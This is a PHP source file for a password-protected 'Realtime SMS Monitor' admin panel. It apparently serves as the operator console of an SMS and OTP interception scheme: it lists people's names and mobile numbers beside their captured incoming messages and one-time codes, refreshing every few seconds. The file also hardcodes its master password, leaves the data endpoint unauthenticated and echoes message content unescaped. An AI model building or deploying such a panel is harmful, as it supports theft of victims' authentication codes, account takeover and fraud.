<?php
session_start();
$master_pass = "050793";
$file = 'data.json';

// Handle Login
if (isset($_POST['login'])) {
    if ($_POST['pass'] === $master_pass) {
        $_SESSION['admin_auth'] = true;
        $_SESSION['login_time'] = time();
    }
}

// Handle 1-hour expiry
if (isset($_SESSION['admin_auth']) && (time() - $_SESSION['login_time'] > 3600)) {
    session_destroy();
    header("Location: aman.php");
}

// Auto-refresh every 10 seconds for realtime feel
if (isset($_GET['ajax'])) {
    $data = json_decode(file_get_contents($file), true);
    foreach ($data as $user) {
        echo "<tr><td>{$user['name']}</td><td>{$user['mobile']}</td>";
        if (!empty($user['sms_log'])) {
            foreach ($user['sms_log'] as $sms) {
                echo "<td><b>{$sms['sender']}:</b> {$sms['body']} <small>({$sms['time']})</small></td>";
            }
        } else {
            echo "<td>No messages yet</td>";
        }
        echo "</tr>";
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #222; color: #fff; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #333; }
        th, td { padding: 12px; border: 1px solid #444; text-align: left; }
        th { background: #0056b3; }
        .login-box { text-align: center; margin-top: 100px; }
        input { padding: 10px; border-radius: 4px; border: none; }
    </style>
</head>
<body>

<?php if (!isset($_SESSION['admin_auth'])): ?>
    <div class="login-box">
        <form method="POST">
            <h2>Admin Panel Login</h2>
            <input type="password" name="pass" placeholder="Password">
            <button type="submit" name="login">Login</button>
        </form>
    </div>
<?php else: ?>
    <h2>Realtime SMS Monitor</h2>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Mobile</th>
                <th>Incoming Messages (OTP/SMS)</th>
            </tr>
        </thead>
        <tbody id="data-table">
            <!-- Data injected here via AJAX -->
        </tbody>
    </table>

    <script>
        function loadData() {
            $.get('aman.php?ajax=1', function(html) {
                $('#data-table').html(html);
            });
        }
        setInterval(loadData, 3000); // Refresh every 3 seconds
        loadData();
    </script>
<?php endif; ?>

</body>
</html>
